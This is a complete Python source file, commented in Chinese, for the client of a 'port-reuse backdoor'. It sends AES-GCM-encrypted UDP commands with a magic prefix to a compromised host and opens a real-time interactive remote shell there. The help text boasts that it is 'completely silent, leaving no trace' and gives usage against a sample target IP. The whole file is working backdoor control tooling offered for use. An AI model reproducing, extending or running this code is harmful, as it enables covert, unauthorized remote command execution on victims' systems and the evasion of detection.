#!/usr/bin/env python3
"""
client.py - 端口复用后门客户端 (真正的异步交互式Shell)

支持 AES-256-GCM 加密通信和真正的实时交互式 Shell

使用方式:
  # 执行单条命令
  python3 client.py -t 192.168.1.100 -p 8000 -c "whoami"

  # 交互式Shell模式（实时双向通信）
  python3 client.py -t 192.168.1.100 -p 8000 -i
"""

import sys
import argparse
import socket
import time
import os
import random
import string
import threading
import select
from datetime import datetime

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except ImportError:
    print("错误: 需要安装 pycryptodome 库")
    print("请运行: pip3 install pycryptodome")
    sys.exit(1)

# 配置常量
MAGIC_PREFIX = "bbiloveyou-"
RESPONSE_PREFIX = "bbresponse-"
MAX_RESPONSE_SIZE = 8192
DEFAULT_TIMEOUT = 10
HEARTBEAT_INTERVAL = 0.1  # 100ms 轮询间隔

# AES-256 密钥 (32字节) - 必须与服务端相同
CRYPTO_KEY = bytes([
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c,
    0x76, 0x2e, 0x71, 0x60, 0xf3, 0x8b, 0x4d, 0xa5,
    0x6a, 0x78, 0x4d, 0x90, 0x45, 0x19, 0x0c, 0xfe
])


def generate_code():
    """生成唯一的命令代码"""
    timestamp = int(time.time() * 1000000)  # 微秒时间戳
    random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{timestamp}{random_part}"


def log(message, level="INFO", quiet=False):
    """打印日志"""
    if quiet:
        return

    timestamp = datetime.now().strftime("%H:%M:%S")
    colors = {
        "INFO": "\033[1;34m",    # 蓝色
        "SUCCESS": "\033[1;32m", # 绿色
        "WARNING": "\033[1;33m", # 黄色
        "ERROR": "\033[1;31m",   # 红色
        "RESET": "\033[0m"
    }

    color = colors.get(level, colors["INFO"])
    print(f"{color}[{timestamp}] [{level}]{colors['RESET']} {message}")


def aes_gcm_encrypt(plaintext):
    """AES-256-GCM 加密"""
    cipher = AES.new(CRYPTO_KEY, AES.MODE_GCM, nonce=get_random_bytes(12))
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())

    # 返回: IV(12) + 密文 + Tag(16)
    return cipher.nonce + ciphertext + tag


def aes_gcm_decrypt(encrypted_data):
    """AES-256-GCM 解密"""
    try:
        # 提取: IV(12) + 密文 + Tag(16)
        nonce = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]

        cipher = AES.new(CRYPTO_KEY, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode('utf-8', errors='ignore')
    except Exception as e:
        return None


class CommandClient:
    """命令客户端类"""

    def __init__(self, target_ip, target_port=8000, timeout=DEFAULT_TIMEOUT, quiet=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.session_id = None  # 交互式会话ID
        self.quiet = quiet  # 静默模式（交互式shell时不显示日志）

        self.sock = None
        self.current_code = None

        # 交互模式相关
        self.running = False
        self.recv_thread = None

    def create_socket(self):
        """创建UDP socket"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.settimeout(self.timeout)
            return True
        except Exception as e:
            log(f"创建socket失败: {e}", "ERROR", self.quiet)
            return False

    def send_command(self, command_type, command=""):
        """
        发送命令到目标
        command_type: "CMD", "INTERACTIVE", "SESSION", "CLOSE"
        """
        self.current_code = generate_code()

        # 构造明文命令
        if command_type == "CMD":
            plaintext = f"{MAGIC_PREFIX}{self.current_code}-CMD-{command}"
        elif command_type == "INTERACTIVE":
            plaintext = f"{MAGIC_PREFIX}{self.current_code}-INTERACTIVE"
        elif command_type == "SESSION":
            plaintext = f"{MAGIC_PREFIX}{self.current_code}-SESSION-{self.session_id}-{command}"
        elif command_type == "CLOSE":
            plaintext = f"{MAGIC_PREFIX}{self.current_code}-CLOSE-{self.session_id}"
        else:
            return False

        try:
            # 加密命令
            encrypted = aes_gcm_encrypt(plaintext)

            # 发送加密数据（UDP不需要提前bind，sendto会自动bind）
            self.sock.sendto(encrypted, (self.target_ip, self.target_port))

            return True

        except Exception as e:
            log(f"发送命令失败: {e}", "ERROR", self.quiet)
            return False

    def wait_for_response(self):
        """等待命令响应（用于单命令模式）"""
        try:
            data, addr = self.sock.recvfrom(MAX_RESPONSE_SIZE)

            # 解密响应
            response = aes_gcm_decrypt(data)
            if not response:
                log("解密响应失败", "ERROR", self.quiet)
                return False

            return self.parse_response(response, addr, verbose=True)

        except socket.timeout:
            log("等待响应超时", "WARNING", self.quiet)
            return False
        except Exception as e:
            log(f"接收响应失败: {e}", "ERROR", self.quiet)
            return False

    def parse_response(self, response, addr, verbose=False):
        """解析命令响应"""
        expected_prefix = f"{RESPONSE_PREFIX}{self.current_code}"

        if not response.startswith(expected_prefix):
            return False

        try:
            # 解析: bbresponse-<code>-<type>-<data>
            parts = response.split('-', 3)

            if len(parts) < 3:
                return False

            code = parts[1] if len(parts) > 1 else "unknown"
            response_type = parts[2] if len(parts) > 2 else "unknown"
            data = parts[3] if len(parts) > 3 else ""

            # 处理不同类型的响应
            if response_type == "SESSION":
                # 会话响应: bbresponse-<code>-SESSION-<session_id>-<output>
                session_parts = data.split('-', 1)
                if len(session_parts) >= 2:
                    session_id = session_parts[0]
                    output = session_parts[1]

                    # 如果是新创建的会话，保存session_id
                    if not self.session_id and "Interactive shell started" in output:
                        self.session_id = session_id
                        if verbose:
                            log(f"交互式会话已创建: {session_id}", "SUCCESS", self.quiet)
                        return True

                    # 输出时使用青色，更容易区分
                    if output and not output.isspace():
                        # 为输出添加颜色标记
                        sys.stdout.write("\033[0;36m")  # 青色
                        sys.stdout.write(output)
                        sys.stdout.write("\033[0m")  # 重置颜色
                        sys.stdout.flush()

            elif response_type == "ERROR":
                if verbose:
                    log(f"服务器错误: {data}", "ERROR", self.quiet)
            else:
                # 普通响应或SUCCESS/FAILED
                if verbose:
                    print("\n" + "="*60)
                    print(f"命令代码: {code}")
                    print(f"状态: {response_type}")
                    print(f"输出:")
                    print("-"*60)
                    print(data.strip())
                    print("="*60 + "\n")

            return True

        except Exception as e:
            return False

    def execute_command(self, command):
        """执行单条普通命令"""
        if not self.create_socket():
            return False

        try:
            log(f"发送命令到 {self.target_ip}:{self.target_port}", "INFO", self.quiet)
            log(f"命令: {command}", "INFO", self.quiet)

            self.send_command("CMD", command)
            log(f"等待响应 (超时: {self.timeout}秒)...", "INFO", self.quiet)

            result = self.wait_for_response()
            return result
        finally:
            if self.sock:
                self.sock.close()

    def receiver_thread(self):
        """接收线程 - 持续接收并显示服务器输出"""
        while self.running:
            try:
                # 使用select实现非阻塞接收
                ready = select.select([self.sock], [], [], 0.1)
                if ready[0]:
                    data, addr = self.sock.recvfrom(MAX_RESPONSE_SIZE)

                    # 解密并解析响应
                    response = aes_gcm_decrypt(data)
                    if response:
                        self.parse_response(response, addr, verbose=False)

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:  # 只在运行时报错
                    pass  # 忽略错误，继续接收

    def interactive_mode_realtime(self):
        """真正的实时交互式Shell模式"""
        print("\n" + "="*60)
        print("实时交互式远程 Shell (加密通信)")
        print("="*60)
        print(f"目标: {self.target_ip}:{self.target_port}")
        print("\n正在启动交互式会话...")
        print("="*60 + "\n")

        if not self.create_socket():
            return

        try:
            # 1. 启动交互式会话
            self.send_command("INTERACTIVE")
            time.sleep(0.5)  # 等待会话创建

            # 接收会话创建响应
            try:
                data, addr = self.sock.recvfrom(MAX_RESPONSE_SIZE)
                response = aes_gcm_decrypt(data)
                if response:
                    self.parse_response(response, addr, verbose=True)
            except:
                pass

            if not self.session_id:
                log("未能获取会话ID，启动失败", "ERROR")
                return

            print(f"\n\033[1;32m交互式会话已启动\033[0m")
            print(f"会话ID: {self.session_id}")
            print("\n提示:")
            print("  - \033[1;33m黄色\033[0m = 你的输入")
            print("  - \033[0;36m青色\033[0m = 服务器输出")
            print("  - Ctrl+C 退出会话")
            print("  - 输入 'exit' 关闭远程Shell\n")

            # 2. 启动接收线程
            self.running = True
            self.quiet = True  # 静默模式
            self.recv_thread = threading.Thread(target=self.receiver_thread, daemon=True)
            self.recv_thread.start()

            # 3. 主线程处理用户输入
            while True:
                try:
                    # 显示提示符并读取用户输入（黄色）
                    sys.stdout.write("\033[1;33m$ \033[0m")
                    sys.stdout.flush()
                    command = input()

                    if not command:
                        continue

                    # 特殊命令处理
                    if command.lower() in ['exit', 'quit']:
                        # 发送exit到远程bash
                        self.send_command("SESSION", "exit")
                        time.sleep(0.2)
                        break

                    # 发送命令
                    self.send_command("SESSION", command)
                    time.sleep(0.2)  # 等待200ms让输出完整显示

                except KeyboardInterrupt:
                    print("\n\n\033[1;33m[!] 用户中断，正在关闭会话...\033[0m")
                    break
                except EOFError:
                    break

        finally:
            # 清理
            self.running = False
            if self.recv_thread and self.recv_thread.is_alive():
                self.recv_thread.join(timeout=1)

            # 发送关闭会话命令
            try:
                self.send_command("CLOSE")
                time.sleep(0.2)
            except:
                pass

            if self.sock:
                self.sock.close()

            print("\n\033[1;32m[+] 会话已关闭\033[0m\n")


def main():
    parser = argparse.ArgumentParser(
        description='端口复用后门客户端 - 真正的实时交互式Shell',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
示例:

执行单条命令:
  python3 client.py -t 192.168.1.100 -p 8000 -c "whoami"
  python3 client.py -t 192.168.1.100 -p 8000 -c "id"
  python3 client.py -t 192.168.1.100 -p 8000 -c "ls -la"

实时交互式Shell模式:
  python3 client.py -t 192.168.1.100 -p 8000 -i

  在交互模式中:
  kali@kali:~$ cd /tmp
  kali@kali:/tmp$ pwd
  /tmp
  kali@kali:/tmp$ export FOO=bar
  kali@kali:/tmp$ echo $FOO
  bar
  kali@kali:/tmp$ exit

特性:
  - AES-256-GCM 加密通信
  - 真正的实时双向交互
  - 支持 cd、export 等状态保持
  - 支持 su、ssh、vim 等需要实时交互的命令
  - 完全静默，不留痕迹
        '''
    )

    # 连接参数
    parser.add_argument('-t', '--target', required=True,
                        help='目标IP地址')
    parser.add_argument('-p', '--port', type=int, default=8000,
                        help='目标端口 (默认: 8000)')

    # 命令参数
    parser.add_argument('-c', '--command',
                        help='要执行的命令')
    parser.add_argument('-i', '--interactive', action='store_true',
                        help='实时交互式Shell模式')
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT,
                        help=f'等待响应超时时间（秒，默认: {DEFAULT_TIMEOUT}）')

    args = parser.parse_args()

    # 验证参数
    if not args.command and not args.interactive:
        log("需要 -c 或 -i 参数", "ERROR")
        parser.print_help()
        sys.exit(1)

    # 创建客户端
    client = CommandClient(
        target_ip=args.target,
        target_port=args.port,
        timeout=args.timeout
    )

    # 执行命令
    if args.interactive:
        client.interactive_mode_realtime()
    else:
        client.execute_command(args.command)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] 用户中断\033[0m")
        sys.exit(0)
    except Exception as e:
        log(f"错误: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)
